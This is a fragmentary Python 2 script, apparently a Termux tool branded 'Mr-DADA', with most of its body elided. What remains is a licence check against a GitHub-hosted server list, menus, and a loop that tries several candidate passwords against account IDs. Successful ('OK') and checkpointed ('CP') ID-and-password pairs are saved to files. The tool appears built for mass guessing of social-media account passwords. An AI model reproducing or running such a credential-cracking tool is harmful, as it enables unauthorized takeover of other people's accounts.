...
__copyright = 'All rights reserved . Copyright  Mr-DADA'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/AbdullahDada420/Filecrack/main/server.txt').text
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+17815150664')
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] Follow Me On Fb'
...
def menu():
    ...
    print '\033[1;92m[2] Follow me on facebook'
...
def menu_s():
    ...
    ms = raw_input('\033[1;97m╰─Mr-DADA➤ ')
...
def a_s():
    ...
    a_s = raw_input(' \033[1;97m╰─Mr-DADA➤ ')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\033[1;95m[DADA-OK]➤ ' + uid + ' | ' + pass1

                ok = open('/sdcard/ids/DADA_OK.txt', 'a')
                ...
                print '\033[1;97m[DADA-CP]➤ ' + uid + ' | ' + pass1

                cp = open('DADA_CP.txt', 'a')
                ...
                if 'loc' in q:
                    ...
                    print '\033[1;95m[DADA-OK]➤ ' + uid + ' | ' + pass2
                    ...
                    print '\033[1;97m[DADA-CP]➤ ' + uid + ' | ' + pass2
                    ...
                    if 'loc' in q:
                        ...
                        print '\033[1;95m[DADA-OK]➤ ' + uid + ' | ' + pass3
                        ...
                        print '\033[1;97m[DADA-CP]➤ ' + uid + ' | ' + pass3
                        ...
                        if 'loc' in q:
                            ...
                            print '\033[1;95m[DADA-OK]➤ ' + uid + ' | ' + pass4
                            ...
                            print '\033[1;97m[DADA-CP]➤ ' + uid + ' | ' + pass4
    ...
    print ' \033[1;92mDADA MEAN MR-DADA PROGRAMMING'
